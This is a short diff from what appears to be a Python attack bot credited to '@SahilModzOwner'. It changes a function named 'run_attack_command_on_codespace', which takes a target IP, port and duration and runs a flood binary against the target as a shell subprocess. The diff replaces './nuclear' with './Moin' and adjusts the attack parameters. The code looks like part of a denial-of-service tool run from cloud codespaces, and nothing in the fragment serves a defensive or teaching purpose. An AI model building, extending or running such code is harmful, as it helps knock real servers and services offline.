@@ -31,7 +31,7 @@ CREATOR = "This File Is Made By @SahilModzOwner"  #DON'T CHANGE THIS WARNA ERROR
 
 # Async function to run attack command
 async def run_attack_command_on_codespace(target_ip, target_port, duration):
-    command = f"./nuclear {target_ip} {target_port} {duration} 1300 1024"
+    command = f"./Moin {target_ip} {target_port} {duration} 1450"
     try:
         process = await asyncio.create_subprocess_shell(
             command,
